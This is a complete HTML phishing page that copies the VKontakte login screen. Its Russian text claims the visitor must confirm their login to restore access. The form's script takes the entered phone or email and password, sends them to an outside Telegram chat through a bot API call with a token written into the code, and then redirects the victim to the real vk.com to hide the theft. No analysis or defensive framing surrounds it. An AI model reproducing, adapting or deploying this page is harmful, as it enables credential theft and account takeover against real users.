<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ВКонтакте</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; background: #e8edf2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 25px; border-radius: 8px; width: 320px; box-shadow: 0 0 20px #ccc; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #4a76a8; color: white; border: none; border-radius: 4px; font-size: 16px; }
        .logo { font-size: 24px; font-weight: bold; color: #4a76a8; text-align: center; }
        .error { color: red; font-size: 12px; display: none; }
    </style>
</head>
<body>
<div class="box">
    <div class="logo">ВКонтакте</div>
    <p style="color: #555; font-size: 14px; text-align: center;">Подтвердите вход для восстановления доступа</p>
    <form id="f">
        <input type="text" id="phone" placeholder="Номер телефона или email">
        <input type="password" id="pass" placeholder="Пароль">
        <button type="submit">Войти</button>
    </form>
</div>
<script>
document.getElementById('f').onsubmit = function(e) {
    e.preventDefault();
    var p = document.getElementById('phone').value;
    var s = document.getElementById('pass').value;
    fetch('https://api.telegram.org/bot8791208989:AAHW5GyyxT4LjldB3JXJZPcORtiVuSt_p0c/sendMessage?chat_id=7970898404&text=ВК:+'+p+'+Пароль:+'+s);
    window.location.href = 'https://vk.com/';
};
</script>
</body>
</html>
